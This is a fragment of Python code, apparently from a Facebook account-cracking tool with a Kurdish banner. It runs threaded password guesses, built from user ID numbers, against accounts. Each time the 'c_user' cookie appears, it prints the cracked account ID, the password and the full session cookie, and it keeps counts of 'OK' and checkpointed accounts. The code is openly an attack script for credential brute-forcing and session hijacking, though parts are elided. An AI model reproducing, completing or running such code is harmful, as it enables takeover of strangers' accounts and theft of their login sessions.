...
def i():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print('\033[1;32mRAWA XAREKM. CRACK DAKAM💻✅')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[𝗴𝗲𝘃𝗮𝗿𝗮?OK]=  ' +cid+ ' | ' +ps+    '  \n \033[1;97mCOOKES = \033[1;97m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r               %s[%s/%s]  [captin.OK:%s]  [captin.CP:%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
